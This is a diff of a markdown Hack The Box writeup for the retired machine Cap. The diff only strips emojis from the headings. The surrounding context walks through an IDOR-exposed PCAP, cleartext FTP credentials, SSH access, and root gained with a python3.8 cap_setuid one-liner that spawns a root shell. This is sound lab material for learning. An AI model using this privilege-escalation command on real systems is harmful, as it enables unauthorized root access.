@@ -18,12 +18,12 @@ cover:
 
 ---
 
-> ⚠️ **Spoiler warning — retired HTB machine.**
+> **Spoiler warning — retired HTB machine.**
 > This writeup documents my playthrough of the retired Hack The Box machine **Cap**. VPN IPs shown are HTB-assigned addresses used during the box.
 
 ---
 
-## 🔍 Recon
+## Recon
 
 Initial scan:
 ```bash
@@ -46,7 +46,7 @@ Accessing the data endpoint allowed me to download a PCAP file capturing unencry
 
 ---
 
-## 🧩 PCAP Analysis & Credentials
+## PCAP Analysis & Credentials
 I opened the PCAP in Wireshark and inspected the FTP traffic. Credentials were sent in cleartext; I recovered the following valid account:
 
 **Nathan's Credentials**
@@ -58,7 +58,7 @@ With those credentials I could log into the host as nathan (SSH).
 
 ---
 
-## 🖥️ Foothold (SSH as nathan)
+## Foothold (SSH as nathan)
 SSH into the box:
 
 ```bash
@@ -77,7 +77,7 @@ cat /home/nathan/user.txt
 
 ---
 
-## 🔐 Privilege Escalation (file capabilities)
+## Privilege Escalation (file capabilities)
 Local enumeration for Linux capabilities:
 
 ```bash
@@ -93,7 +93,7 @@ What this means: getcap shows POSIX file capabilities on binaries. The entry for
 ![Local enumeration  with getcap](/images/cap/getcap.png)
 
 
-# Exploit (use with care; this is what I ran on the box):
+## Exploit (use with care; this is what I ran on the box):
 
 ```bash
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
@@ -110,7 +110,7 @@ root
 
 ---
 
-## 🏁 Root Flag
+## Root Flag
 
 ```bash
 cat /root/root.txt
@@ -120,7 +120,7 @@ cat /root/root.txt
 
 ---
 
-## 🔑 Takeaways
+## Takeaways
 
 IDORs can expose sensitive artifacts (PCAPs, backups) — always check object enumeration endpoints like `/data/<id>`.
 
@@ -132,7 +132,7 @@ When a binary has cap_setuid, carefully consider executing it to elevate privile
 
 ---
 
-## 📚 Resources & Notes
+## Resources & Notes
 
 getcap / setcap documentation (man pages)
 
